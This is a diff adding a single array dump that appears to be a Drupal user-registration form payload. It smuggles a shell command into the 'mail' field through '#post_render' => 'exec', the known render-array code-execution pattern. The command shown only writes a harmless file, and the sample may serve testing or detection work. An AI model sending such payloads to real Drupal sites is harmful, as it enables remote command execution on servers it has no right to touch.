@@ -1,0 +1,16 @@
+Array
+(
+    [form_id] => user_register_form
+    [_drupal_ajax] => 1
+    [mail] => Array
+        (
+            [#post_render] => Array
+                (
+                    [0] => exec
+                )
+
+            [#type] => markup
+            [#markup] => echo ";-)" | tee hello.txt
+        )
+
+)
